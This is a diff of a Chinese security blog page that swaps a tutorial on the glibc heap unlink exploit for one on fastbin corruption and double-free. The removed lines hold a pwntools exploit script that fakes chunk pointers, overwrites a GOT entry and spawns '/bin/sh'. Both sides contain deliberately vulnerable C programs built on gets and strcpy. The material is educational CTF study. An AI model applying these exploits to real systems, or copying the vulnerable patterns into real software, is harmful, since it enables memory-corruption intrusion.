@@ -4,12 +4,13 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="glibc heap unlink漏洞, 时钟">
-    <meta name="description" content="知识点：
+    <meta name="keywords" content="glibc heap Fastbin Corruption, 时钟">
+    <meta name="description" content="基础知识：
 
-free操作会检查前后相邻堆块是否in_use，空闲的话就会进行合并操作
-空闲的堆块一般以双向链表的形式存在（fastbin是单向链表不适用此种攻击）
-unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需">
+fastbin: Chunk Size &amp;lt;= get_max_fast()的chunk（其实就是64bits的是128bytes，32位的是64bytes）  ，它们会被放在被称为fastbin的bin里面
+
+
+上面的f">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@ unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并�
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>glibc heap unlink漏洞 | 时钟</title>
+    <title>glibc heap Fastbin Corruption | 时钟</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -243,13 +244,13 @@ unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并�
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        glibc heap unlink漏洞
+                        glibc heap Fastbin Corruption
                     </div>
                 </div>
             </div>
@@ -358,25 +359,12 @@ unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并�
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/pwn/" target="_blank">
-                                <span class="chip bg-color">pwn</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fa fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
-                                漏洞利用
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -384,21 +372,21 @@ unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并�
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-08-02
+                    2019-08-16
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.7k
+                        1.3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        12 分
+                        5 分
                     </div>
                     
                 
@@ -414,269 +402,135 @@ unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并�
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>知识点：</p>
-<ol>
-<li>free操作会检查前后相邻堆块是否in_use，空闲的话就会进行合并操作</li>
-<li>空闲的堆块一般以双向链表的形式存在（fastbin是单向链表不适用此种攻击）</li>
-<li>unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需要把前面或者后面的堆块从双向链表中摘取下来，合成更大的堆块插入到别的bin之中，将空闲堆块从bin里面摘取下来的操作就是unlink</li>
-<li>chunk中的flag标志位 ： flag来源 ，size字节需要8字节对齐，就会空余出来3个bit, 其中最低位表示前一个chunk是否在使用，倒数第二位表示这个chunk是否通过mmap的方式产生，第三个表示 该chunk是否属于一个线程的arena</li>
-<li>fd : 指向下一个空闲的chunk，bk指向上一个空闲的chunk</li>
-<li>下面是一个往前合并的源码 ：值得注意的就是free在unlink的时候是先进行backward 然后 forward<pre><code>             /* consolidate backward 往前合并*/
-            if (!prev_inuse(p)) {     //先检查要free chunk的上一个chunk是不是 in_use，不是的话就往下操作
-                    prevsize = prev_size(p);   //取p的前一个chunk的size（利用的是p chunk的prev_size）
-                    size += prevsize;    //free_chunk的size + 上一个chunk的size
-                    p = chunk_at_offset(p, -((long)prevsize));  //p指向上一个chunk的开始处 
-                    if (__glibc_unlikely(chunksize(p) != prevsize))   //然后这个应该是检查prev_size对不对，利用的是前后改变的chunk的size大小跟prev_size是不是相等
-                           malloc_printerr(&quot;corrupted size vs. prev_size while  consolidating&quot;);
-                    unlink(av, p, bck, fwd);   //这个就是我们要利用的地方了，下面有详解
-            }
-</code></pre></li>
-<li>同时我截取_int_free的一段源码进行解析：<pre><code>_int_free(mstate av, mchunkptr p, int have_lock)  //这是它的参数 av是指向main_arena , p是指向要free的chunk
-{
-if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0)   //这个是检查pointer是否合法
-if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))  //这个检查chunk的size是否合法
-if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast())  //还要检查是否属于fastbin 因为fastbin free的时候有自己的方式
-else if (!chunk_is_mmapped(p))  //上面那个检查通过后直接跳到这里，检查是否是mmap出来的chunk
-}
-</code></pre>8.最重要的就是合并时候的操作： 看6.<br>9.然后就是unlink了：<pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分
-/*malloc.c  int_free函数中*/
-/* consolidate backward */
-if (!prev_inuse(p)) {
-  prevsize = p-&gt;prev_size;
-size += prevsize;
-  p = chunk_at_offset(p, -((long) prevsize));
-  unlink(p, bck, fwd);
-}   /*这一部分前面讲过了*/
-//相关函数说明：
-/* Treat space at ptr + offset as a chunk */
-#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
-/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/
-#define unlink(P, BK, FD) {                                            \
-FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来
-BK = P-&gt;bk;                                   \
-FD-&gt;bk = BK;                                  \
-BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）
-...     //后面又是一顿操作，把合并的chunk给放到新的bin里面
-}
-</code></pre>10.我们说一下如何利用：</li>
-</ol>
+                <p>基础知识：</p>
 <ul>
-<li>如果有heap overflow可以覆盖到某一个chunk q 的prev_size. 那么free q 时传入unlink（p）的 p 就可以控制</li>
-<li>使得chunk p的内容可以被控制</li>
-<li>FD = P -&gt; fd ; BK = P -&gt; bk ;  我们可以使得 PK = P -&gt; fd = <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18 （这就是的PK的bk处被写成了<a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a>） , BK = P -&gt; bk = shellcode ,那么free @got.plt就会被写入成为shellcode</li>
-<li>但是，BK-&gt;fd = FD 那么你之前写入的shellcode的第16个bit开始会被改成 <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18  ，针对这个其实我们就可以开头插入一个jmp去跳过它</li>
+<li>fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128bytes，32位的是64bytes）  ，它们会被放在被称为fastbin的bin里面</li>
 </ul>
-<p>一个实验用的（这里是32位的，大致跟64位利用相同）</p>
-<pre><code>#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-int main( int argc, char * argv[] )
-{
-        char * first, * second;
-/*[1]*/ first = malloc( 666 );
-/*[2]*/ second = malloc( 12 );
-        if(argc!=1)
-/*[3]*/         strcpy( first, argv[1] );
-/*[4]*/ free( first );
-/*[5]*/ free( second );
-/*[6]*/ return( 0 );
-}
-</code></pre><p>在所有的malloc执行完之后：<br><img src="/2019/08/02/glibc-heap-unlink-lou-dong/1.png" title="This is an image"><br>unlink源码分析：</p>
-<p>先后合并（把当前chunk的前一个chunk和当前chunk合并）</p>
-<pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分
-    /*malloc.c  int_free函数中*/
-/* consolidate backward */
-    if (!prev_inuse(p)) {
-      prevsize = p-&gt;prev_size;
-size += prevsize;
-      p = chunk_at_offset(p, -((long) prevsize));
-      unlink(p, bck, fwd);
-}   /*这一部分前面讲过了*/
-//相关函数说明：
-/* Treat space at ptr + offset as a chunk */
-#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
-/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/
-#define unlink(P, BK, FD) {                                            \
-    FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来
-    BK = P-&gt;bk;                                   
-    FD-&gt;bk = BK;                                  
-    BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）
-    ...     //后面又是一顿操作，把合并的chunk给放到新的bin里面
-}
-</code></pre><p>malloc第一个chunk的prev_inuse标志一直都是1 虽然它事实上不存在<br>向前合并（forward） ：<br>检查next chunk是否处于free状态，我们回去检查next next chunk的prev_inuse标志位是否为1，下面是源码：</p>
-<pre><code>#!c
-……
-/*这里p指向当前chunk*/
-nextchunk = chunk_at_offset(p, size);
-……
-nextsize = chunksize(nextchunk);
-……
-if (nextchunk != av-&gt;top) {
-      /* get and clear inuse bit */
-      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//判断nextchunk是否为free chunk
-      /* consolidate forward */
-      if (!nextinuse) { //next chunk为free chunk
-            unlink(nextchunk, bck, fwd); //将nextchunk从链表中移除
-          size += nextsize; // p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！
-      } else
-            clear_inuse_bit_at_offset(nextchunk, 0);    
+<img src="/2019/08/16/glibc-heap-fastbin-corruption/1.png" title="This is an image">
+<p>上面的fastbinsY 里面存放fastbin , 最大是128bytes,最小是32bytes,然后依次加16bytes,32位的类似，不过最大是64bytes</p>
+<ul>
+<li>需要注意的是get_max_fast()事实上返回的是 global_max_fast，但是这个值得初始值为0，只有当第一次malloc之后它才会被赋值为相应的值</li>
+<li>同时fastbin是Single linked list，所以它只使用fd,以NULL结尾</li>
+<li>free的时候呢，不取消下一个chunk 的prev_inuse bit，因为fastbin chunk不会和其他chunk合并</li>
+<li>malloc 和 free的时候glibc会有一些检查，确认heap metadata是否正确，避免一些可能的攻击方式</li>
+<li>fastbin执行效率高，它的里面的检查比其他类型的bin少很多</li>
+<li>fastbin的linklist和其他的相反，跟Stack很像free和malloc的时候先进后出</li>
+<li>fastbin的prev_inuse标志位在free的时候不会改变还是1，这防止了它和其他的free_chunk进行合并操作</li>
+</ul>
+<p>Fastbin Corruption：</p>
+<pre><code>1..让fastbin linked list 指向任意位置，之后的malloc时就会把改地址当做chunk拿出来
 
-      ……
-    }
-</code></pre><p>在这个例子中next next chunk 就是top chunk，那么top chunk 的prev_inuse始终为1 ，所以也不会进行向前合并，但是我们可以利用堆溢出伪造，不过，我们还要了解一下合并后或者不满足条件没合并的chunk会怎么办：glibc malloc中会把他们放到unsorted bin之中</p>
-<pre><code>#!c
-/*
-Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.
-*/  
-bck = unsorted_chunks(av); //获取unsorted bin的第一个chunk
-/*
-  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */
-    #define unsorted_chunks(M)          (bin_at (M, 1))
-*/
-      fwd = bck-&gt;fd;
-      ……
-      p-&gt;fd = fwd;
-      p-&gt;bk = bck;
-      if (!in_smallbin_range(size))
+ 2.free（not in_use）的chunk会被存在bin里面，修改它的fd才会造成corruption
+    1.double free
+    2.Over flow
+</code></pre><p>fastbin的检查方式：</p>
+<ul>
+<li>malloc从bin里面取出chunk,要拿到合适大小的chunk（检查你这个chunk的chunk_size</li>
+<li>free的时候，next_chunk的size必须正确（overflow的时候才会用到）</li>
+<li>free时看看bin里面的第一个chunk和现在要free的是不是同一个（fasttop），这个的缺点就是它只和第一个检查，那么你可以在double free之前先free一个其他的大小合适的chunk</li>
+</ul>
+<p>我们可以看源码了解一下（源码我会的不多，只说点关键的）<br>对应1：</p>
+<pre><code>    //这个nb是chunk的bytes 它来源于上面的一个checked_request2size(bytes,nb) 这的作用就是malloc的bytes+8然后16对齐
+        if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))   //chunk的size(nb)小于128 or 64的话就会执行下面
         {
-          p-&gt;fd_nextsize = NULL;
-          p-&gt;bk_nextsize = NULL;
-        }
-      bck-&gt;fd = p;
-      fwd-&gt;bk = p;  
+               idx = fastbin_index(nb);     //这是在fastbin里面找，把chunk的size转换成fastbin里面对应的哪一个（size/16-2）注意：0是fastbin的第一个
+               mfastbinptr *fb = &amp;fastbin(av, idx);
+               mchunkptr pp;
+               victim = *fb;
+               if (victim != NULL)
+               {
+                       if (SINGLE_THREAD_P)
+                              *fb = victim-&gt;fd;
 
-
-      set_head(p, size | PREV_INUSE);//设置当前chunk的size,并将前一个chunk标记为已使用
-set_foot(p, size);//将后一个chunk的prev_size设置为当前chunk的size
-/*
-   /* Set size/use field */
-   #define set_head(p, s)       ((p)-&gt;size = (s))
-   /* Set size at footer (only when chunk is not in use) */
-   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))
-*/
-</code></pre><p>上面基本就是说，free后的chunk插入到unsorted chunk的第一个chunk(这个其实是bin)与下一个chunk（这个才是真正可用的第一个chunk）的中间当做表头，然后通过设置自己的size字段来表示前一个chunk可用，然后更改next chunk的prev_size为改chunk的大小，<br>但是本例中的chunk second没被放入unsort bin，而是放入了fastbin.<br>下面我们可以精心布置chunk second来实现攻击：<br>1.我们要修改chunk second 的chunk header</p>
-<ul>
-<li>任意数</li>
-<li>size = -4  -4 = 11111100  //这个主要是控制prev_inuse 位</li>
-<li>fd = free函数的got表地址-12</li>
-<li>bk = shellcode的地址</li>
-</ul>
-<p>这样程序在继续运行得话如果free(first) , 我们要考虑是否合并，首先肯定不会向后合并，那就考虑向后合并，glibc通过chunk second 的size + chunk second 的prev_size 来确定next next chunk，那么现在size是-4，那么现在next_chunk，被当做next next chunk，因为size = -4所以next_chunk被当做free的，然后出发unlink，进行合并操作，</p>
-<pre><code>BK=second-&gt;bk（在例子中bk实际上是shellcode的地址）
-FD=second-&gt;fd (在例子中fd实际上是free@got的地址 - 12)
-FD-&gt;bk=BK
-/*shellcode被写进了FD+12的位置，但是FD是free@got的地址-12，所以实际上我们已经把shellcode地址写入了free@got*/
-BK-&gt;fd=FD
-</code></pre><p>可是新的glibc增加了保护机制防止unlink,但是仍然可以绕过，下面同用于64和32位,但是例子是64位的：<br>检查源码：</p>
-<pre><code>#define unlink(P, BK, FD) {                                            
-    FD = P-&gt;fd;                         
-    BK = P-&gt;bk;   
-    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))       //具体就是说在进行unlink操作之前，会先检查当前chunk的prev_chunk的fd和next_chunk的bk是不是当前chunk。      
-      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);                                  
-    FD-&gt;bk = BK;                                  
-    BK-&gt;fd = FD;                               
-    ...     
-}
-</code></pre><p>overwrite Heap Pointer 利用条件:</p>
-<ul>
-<li>有一个指针指向heap</li>
-<li>存放改指针的地址已知（比如改指针是全局变量）</li>
-<li>可以对改指针多次写入 </li>
-</ul>
-<p>那么我们就可以构造下面来越过检查：</p>
-<ul>
-<li>p -&gt; fd = &amp;p - 0x18</li>
-<li>p -&gt; bk = &amp;p - 0x10</li>
-<li>接着源码继续进行 ， FD -&gt; bk = BK ; BK - &gt; fd = FD; </li>
-<li>上述完成后我们得到的结果是 ： p = &amp;p - 0x18 </li>
-</ul>
-<p>引入一个例题（这个例题可以用来解释，但是实际操作的时候呢，程序会因为stdout,stdin，生成chunk 夹在中间，使得程序利用难以实现），不过重要的是思路：</p>
-<pre><code>#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
-#include&lt;string.h&gt;
-#include&lt;unistd.h&gt;
-char *cmd;
-void sh(char *c)
+                       else
+                              REMOVE_FB(fb, pp, victim);
+                       if (__glibc_likely(victim != NULL))
+                       {
+                              size_t victim_idx = fastbin_index(chunksize(victim));   //victim是要等一下要return的chunk
+                              if (__builtin_expect(victim_idx != idx, 0))      //这边就是在检查你拿出来的chunk的idx跟bin的idx是不是一样，不对的话error
+                                      malloc_printerr(&quot;malloc(): memory corruption  (fast)&quot;);
+</code></pre><p>对应2：</p>
+<pre><code>               if (SINGLE_THREAD_P)
+               {
+                       /* Check that the top of the bin is not the record we are going to
+                          add (i.e., double free).  */
+                       if (__builtin_expect(old == p, 0))   //这个检查就是看看你free的chunk跟bin里面的chunk是不是同一个，同一个的话就error
+                              malloc_printerr(&quot;double free or corruption (fasttop)&quot;);
+                       p-&gt;fd = old;
+                       *fb = p;
+               }
+</code></pre><p>double free也会形成类似UAF的效果，可以改掉bin里面的chunk的fd，可以看一下调试截图和源码</p>
+<pre><code>int main()
 {
-    system(c);
+    void *p,*q,*r,*s;
+    p = malloc(30);
+    q = malloc(30);
+    free(q);
+    free(p);
+    free(q); 第一次断点下在这里
+}
+</code></pre><img src="/2019/08/16/glibc-heap-fastbin-corruption/2.png" title="This is an image">
+<img src="/2019/08/16/glibc-heap-fastbin-corruption/3.png" title="This is an image">
+<img src="/2019/08/16/glibc-heap-fastbin-corruption/4.png" title="This is an image">
+<p>更重要的是，现在bin里面有两个q（其实是同一块）都指向了P，<br>利用姿势注意点：</p>
+<ol>
+<li><p>取出的chunk 的size要正确，所以也不是任意地址，需要可以制作假的size</p>
+<ol>
+<li>stack上的变量做size ，可以malloc出一个stack上的位置  （可以制作stack上的overflow）</li>
+<li>got上，用64bits地址常见的0x40（这个got没被call过的话）做size</li>
+</ol>
+</li>
+<li><p>取得chunk后，有机会对改地址任意写</p>
+</li>
+</ol>
+<p>fastbin double free:</p>
+<ol>
+<li>fasttop只检查bin里面的第一个chunk,只要不是连续free同一个chunk就没关系</li>
+<li>double free有类似use after free的效果，可以改掉bin里面的chunk的fd</li>
+</ol>
+<p>例子：</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#include&lt;stdlib.h&gt;
+void sh(char *cmd)
+{
+    system(cmd);
 }
 int main()
 {
-    char *ptr[8];
-    int size;
-    int n;
     setvbuf(stdout,0,_IONBF,0);
+    int cmd,idx,sz;
+    char *ptr[10];
     memset(ptr,0,sizeof(ptr));
-    cmd = malloc(128);    //这里有一个地址已知的全局变量指针，还指向了heap , 而且下面的fgets可以实现对改指针的多次写入
+    puts(&quot;1. malloc + gets\n2. free\n3. puts&quot;);
     while(1)
     {
-        fgets(cmd,128,stdin);
-        if(!strncmp(cmd,&quot;add&quot;,3))
+        printf(&quot;&gt; &quot;);
+        scanf(&quot;%d %d&quot;,&amp;cmd, &amp;idx);
+        idx %= 10;
+        if(cmd==1)
         {
-            printf(&quot;Index: &quot;);
-            scanf(&quot;%d&quot;,&amp;n);
-            if(n&gt;=0 &amp;&amp; n&lt;8)
-            {
-                printf(&quot;Size: &quot;);
-                scanf(&quot;%d%*c&quot;,&amp;size);
-                ptr[n] = malloc(size);
-                printf(&quot;Data: &quot;);
-                gets(ptr[n]);
-            }
-            else
-            {
-                puts(&quot;out of bound&quot;);
-            }
+            scanf(&quot;%d%*c&quot;,&amp;sz);
+            ptr[idx] = malloc(sz);
+            gets(ptr[idx]);
         }
-        else if(!strncmp(cmd,&quot;renove&quot;,6))
+        else if(cmd==2)
         {
-            printf(&quot;Index: &quot;);
-            scanf(&quot;%d%*c&quot;,&amp;n);
-            if(n&gt;=0 &amp;&amp; n&lt;8 &amp;&amp; ptr[n])
-            {
-                puts(ptr[n]);
-                free(ptr[n]);
-                ptr[n] = 0;
-            }
-            else
-            {
-                puts(&quot;nothing here&quot;);
-            }
+            free(ptr[idx]);
+        }
+        else if(cmd==3)
+        {
+            puts(ptr[idx]);
         }
         else
         {
-            puts(&quot;unkonw command&quot;);
+            exit(0);
         }
     }
     return 0;
 }
-</code></pre><p>下面我们先给出脚本来方便分析</p>
-<pre><code>#coding:utf-8
-from pwn import *
-context.log_level = &quot;debug&quot;
-r = remote(&#39;0.0.0.0&#39;,4000)
-#r = process(&#39;./unlink2&#39;)
-elf = ELF(&#39;unlink3&#39;)
-malloc_got = elf.got[&#39;malloc&#39;]
-sh_addr = 0x0000000004008A9
-def malloc(idx,size,data):
-    r.sendline(&#39;add&#39; + &#39;0&#39;*5 + p64(0x100) + p64(0x0000000006010B0-0x18)+p64(0x0000000006010B0-0x10))    3这里就在于构造FD的fd 和 bk 用于躲过检查
-    r.sendline(str(idx))
-    r.sendline(str(size))
-    r.sendline(str(data))
-def free(idx):
-    r.sendline(&#39;renove&#39;)
-    r.sendline(str(idx))
-malloc(0,130,&#39;aaaaaaaa&#39;)
-malloc(1,130,&#39;bbbbbbbb&#39;)
-free(0)
-malloc(2,130, 0x80 * &#39;a&#39; + p64(0x1120) + p64(0x90))  #利用heap overflow 改变下一个chunk的prev_size 和 size
-free(1)   #之后&amp;cmd = 0x0000000006010B0 - 0x18 ,这里要注意的是不是free(2),因为上一步改了size位，所以2相当于还是free着呢，所以free(2),会触碰double free检查
-payload1 = &#39;a&#39; * 0x18 + p64(malloc_got)  //这是的cmd指针 已经被修改了 ， 我们通过fget 可以使得cmd 再次被改为 malloc@got.plt
-r.sendline(payload1)
-payload2 = p64(sh_addr) + &#39;;/bin/sh\x00&#39;   //这里就是构造sh函数  ， 可能参数写错了  
-r.sendline(payload2)
-r.interactive()
-</code></pre>
+</code></pre><p>在64位机器上这个题目有个经典的手法来必过fastbin的检查，因为malloc必须要拿到合适的chunk,所以你malloc的chunk的size位必须要跟fastbin里面的chunk的size大小相同，我们可以在构造fastbin的时候用到了double free,这个操作就是先随便malloc2个大小一样的chunk p和q（必须是fastbin的大小）,我们一次free p q p，那么就会绕过一个fastbin检测，同时这个double free也会形成一个类似环状的fastbin<br><img src="/2019/08/16/glibc-heap-fastbin-corruption/5.png" title="This is an image"><br>那么在malloc的时候，如果从这个bin里面获取chunk的话，我们就可以通过三次malloc，两次使用chunk p,这样就可以利用gets实现有限制的地址写入，这个限制就来源于chunk大小检查，同样我们可以利用64位机器好多都是0x40,来将malloc的chunk p利用gets修改到got表的相应位置，那么第三次malloc就会把这个地址的内存当做一个chunk来取出来，进行gets，我们写入shell的地址，那么下次调用got表相应函数的时候就直接getshell</p>
+
             </div>
             <hr>
 
@@ -707,9 +561,9 @@ r.interactive()
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《glibc heap unlink漏洞》
+                    《glibc heap Fastbin Corruption》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/02/glibc-heap-unlink-lou-dong/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/16/glibc-heap-fastbin-corruption/" property="cc:attributionName" rel="cc:attributionURL">
                 时钟
             </a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
@@ -750,49 +604,42 @@ r.interactive()
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/08/02/glibc-heap-uaf/">
+                <a href="/2019/08/16/glibc-heap-fastbin-corruption/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="glibc heap UAF">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="glibc heap Fastbin Corruption">
                         
-                        <span class="card-title">glibc heap UAF</span>
+                        <span class="card-title">glibc heap Fastbin Corruption</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            use after free（UAF）
+                            基础知识：
 
-重新malloc一样的大小，会拿到曾经Free的chunk，此时就会有两个指针p，和q指向同一个内存块，使用这两个的指针操作混在一起（之前的哪个指针在chun被free后没有被置为NULL，形成悬空
+fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128bytes，32位的是64bytes）  ，它们会被放在被称为fastbin的bin里面
+
+
+上面的f
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-16
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
-                                    漏洞利用
-                                </a>
-                            
+                            <i class="fa fa-user fa-fw"></i>
+                            时钟
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/pwn/" target="_blank">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -800,31 +647,30 @@ r.interactive()
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/08/02/glibc-heap-unlink-lou-dong/">
+                <a href="/2019/08/16/chunk-extend-and-overlapping/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="glibc heap unlink漏洞">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Chunk Extend and Overlapping">
                         
-                        <span class="card-title">glibc heap unlink漏洞</span>
+                        <span class="card-title">Chunk Extend and Overlapping</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            知识点：
+                            chunk extend 堆利用：    程序中堆的利用 可以控制chunk header中的数据 例如：heap overflowptmalloc 对chunk 操作的存在漏洞。
+首先：怎么获取chunk的大小？
 
-free操作会检查前后相邻堆块是否in_use，空闲的话就会进行合并操作
-空闲的堆块一般以双向链表的形式存在（fastbin是单向链表不适用此种攻击）
-unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需
+/* Get size
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-02
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-16
                             </span>
                         <span class="publish-author">
                             
@@ -838,7 +684,6 @@ unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并�
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
